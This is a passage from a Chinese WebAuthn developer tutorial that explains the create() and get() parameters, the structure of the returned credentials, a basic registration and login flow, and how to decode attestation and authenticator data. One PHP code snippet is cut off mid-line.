NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        